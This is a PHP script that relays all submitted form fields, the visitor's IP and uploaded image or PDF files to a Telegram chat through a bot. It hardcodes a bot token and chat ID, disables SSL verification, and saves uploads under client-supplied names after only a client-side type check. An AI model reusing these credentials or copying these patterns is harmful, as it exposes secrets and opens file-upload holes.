<?php
$tg_bot_token = "6748459440:AAEPxEzc65UWySkUMEeiqzHqL7PeA9WIALg";
$chat_id = "-4051287994";

$text = '';

foreach ($_POST as $key => $val) {
    // Декодирование значения из URL-кодированной строки
    $decoded_val = urldecode($val);
    $text .= htmlspecialchars($key) . ": " . htmlspecialchars($decoded_val) . "\n";
}

$text .= "\n" . $_SERVER['REMOTE_ADDR'];
$text .= "\n" . date('d.m.y H:i:s');

$param = [
    "chat_id" => $chat_id,
    "text" => $text
];

$url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendMessage?" . http_build_query($param);

$response = file_get_contents($url);

if ($response === false) {
    // Обработка ошибки при отправке текстового сообщения
    error_log("Error sending text message to Telegram");
} else {
    foreach ($_FILES as $file) {
        if (isValidFile($file)) {
            $url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendDocument";

            // Генерация уникального имени файла
            $unique_filename = uniqid() . "_" . $file['name'];

            move_uploaded_file($file['tmp_name'], $unique_filename);

            $document = new \CURLFile($unique_filename);

            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $chat_id, "document" => $document]);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

            $out = curl_exec($ch);

            curl_close($ch);

            unlink($unique_filename);

            if ($out === false) {
                // Обработка ошибки при отправке файла
                error_log("Error sending file to Telegram");
            }
        } else {
            // Обработка ошибки в случае, если тип файла или размер не соответствует ожидаемым значениям
            error_log("Invalid file type or size");
        }
    }
}

die('1');

function isValidFile($file) {
    $allowed_types = ['image/jpeg', 'image/png', 'application/pdf'];
    $max_file_size = 5 * 1024 * 1024;

    return in_array($file['type'], $allowed_types) && $file['size'] <= $max_file_size;
}
?>
